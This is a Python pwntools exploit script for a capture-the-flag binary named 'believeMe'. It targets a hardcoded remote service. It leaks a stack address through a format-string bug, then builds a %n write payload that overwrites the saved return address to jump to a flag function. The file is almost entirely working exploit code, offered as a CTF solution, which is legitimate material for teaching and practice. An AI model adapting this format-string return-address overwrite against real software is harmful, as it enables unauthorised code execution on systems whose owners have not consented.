__author__ = 'Tomer Eyzenberg'

from pwn import *
import os

EXPLOIT_REMOTE = True

IP = '18.223.228.52'
PORT = 13337
C_NAME = 'believeMe'

LOCAL_LEAK = 0xffffcbe0 + 0x1c  # when aslr off address checked
# LOCAL_RET_EIP = [LOCAL_LEAK] + 0x98

DIR_PATH = os.path.dirname(os.path.realpath(__file__))


def leak_remote_ret_eip(offset_to_stack_leak):
    if EXPLOIT_REMOTE:
        r = remote(host=IP, port=PORT)
    else:
        r = process(['./{}'.format(C_NAME)])
    print r.recvuntil('But......... how ????')
    r.sendline('%{off}$x'.format(off=str(offset_to_stack_leak)))
    ret = r.recvall()
    return int(ret.strip(), 16) - 0x98


def get_offset_to_stack_leak():
    program = os.path.join(DIR_PATH, '{}'.format(C_NAME))
    p = process([program])
    # main + 0x7C -> printf(s)
    # LEAK = 0xffffcc6c -> found ptr to stack on the stack
    # RET_EIP = [LEAK] + 0x98

    gdb.attach(p, """
b * main + 0x7C
commands
    fmtarg {leak}
    
end
c""".format(leak=str(hex(LOCAL_LEAK))))
    print p.sendline('aaa')
    print str(hex(LOCAL_LEAK))
    # pop up shell with correct offset
    return 7  # return int(raw_input('input offset:'))


def get_offset_to_fmt():
    def exec_fmt(payload):
        p = process([program])
        p.sendline(payload)
        return p.recvall()

    program = './{}'.format(C_NAME)
    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset
    return offset


def main(save):
    if save:
        wget(url='https://ctf18.noxale.com/files/24fb1b1d0dc5df9672c32532bab68b65/believeMe', save=C_NAME)

    e = ELF(C_NAME)

    offset_fmt = get_offset_to_fmt()
    print 'offset_fmt: {}'.format(offset_fmt)
    offset_leak = get_offset_to_stack_leak()
    print 'offset_leak: {}'.format(offset_leak)
    remote_ret_eip = leak_remote_ret_eip(offset_to_stack_leak=offset_leak)
    print 'remote_ret_eip: {}'.format(remote_ret_eip)
    noxflag_func = e.functions['noxFlag'].address
    print 'noxflag_func: {}'.format(noxflag_func)

    if EXPLOIT_REMOTE:
        r = remote(host=IP, port=PORT)
    else:
        r = process(['./{}'.format(C_NAME)])
    print r.recvline()

    r1 = (noxflag_func & 0xffff) - 0x8
    r2 = (0xffff - r1) + (noxflag_func >> 16) & 0xffff
    r2 -= 0x7

    off1 = offset_fmt
    off2 = off1 + 1

    payload = '{remote_ret_eip_1}{remote_ret_eip_2}%{r1}x%{off1}$n%{r2}x%{off2}$n'.format(
        remote_ret_eip_1=pack(remote_ret_eip, word_size=32),
        remote_ret_eip_2=pack(remote_ret_eip + 2, word_size=32),
        r1=r1,
        r2=r2,
        off1=off1,
        off2=off2)

    print 'len:{}'.format(len(payload))
    print r.sendline(payload)
    r.interactive()


if __name__ == '__main__':
    main(save=False)
